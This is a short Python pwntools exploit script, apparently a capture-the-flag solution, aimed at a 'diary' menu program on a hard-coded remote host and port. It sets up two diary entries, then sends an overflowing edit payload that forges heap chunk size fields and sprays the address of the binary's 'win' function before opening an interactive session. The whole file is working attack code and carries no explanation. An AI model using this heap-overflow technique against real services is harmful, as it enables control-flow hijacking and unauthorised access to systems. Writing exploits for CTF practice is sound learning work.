from pwn import *

REMOTE = True
if REMOTE:
    HOST,PORT = '54.180.153.92', 50002
else:
    HOST, PORT = 'localhost', 50002

io = remote(HOST, PORT)
#io = process('../challenge/main')
elf = ELF('../challenge/main')
win = elf.symbols['win']

def add_diary(page, name, content):
    io.sendlineafter('> ', '1')
    io.sendlineafter('page > ', str(page))
    io.sendlineafter('name > ', name)
    io.sendlineafter('content > ', content)

def edit_diary(page, name, content):
    io.sendlineafter('> ', '2')
    io.sendlineafter('page > ', str(page))
    io.sendlineafter('name > ', name)
    io.sendlineafter('content > ', content)

def delete_diary(page):
    io.sendlineafter('> ', '3')
    io.sendlineafter('page > ', str(page))

add_diary(0, "a", "b")
add_diary(1, "a", "b")
pause()
edit_diary(0,"a", b"b"*8*33 + p64(0x21) + p64(0x0) * 2 + p64(0x0) + p64(0x1e1) + b'a'*8*28 + p64(win) * 31 + p64(0x61) + p64(win) * 8 + p64(win) + p64(0x21) + p64(win) * 3 + p64(0x111) + p64(0x62))
io.sendlineafter('> ', '4')
io.sendlineafter('> ', '1')
io.interactive()
